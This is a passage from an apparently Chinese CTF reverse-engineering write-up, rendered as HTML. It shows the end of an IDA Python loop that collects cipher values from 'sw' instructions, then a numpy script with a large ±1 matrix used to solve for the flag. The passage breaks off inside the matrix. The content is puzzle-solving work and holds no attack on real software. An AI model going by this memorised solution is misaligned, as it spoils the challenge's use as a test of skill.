&quot;sw&quot; in GetDisasm(addr):</span><br><span class="line">            print(&quot;== cipher[%d]&quot;%counter_c)</span><br><span class="line">            addr = next</span><br><span class="line">            addr = next_instr(addr)</span><br><span class="line">            addr = next_instr(addr)</span><br><span class="line">            break</span><br><span class="line">        addr = next</span><br><span class="line">    counter_c+=1</span><br></pre></td></tr></table></figure>
<p>然后用文本操作提取出矩阵，解出flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack</span><br><span class="line">A = mat([[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span 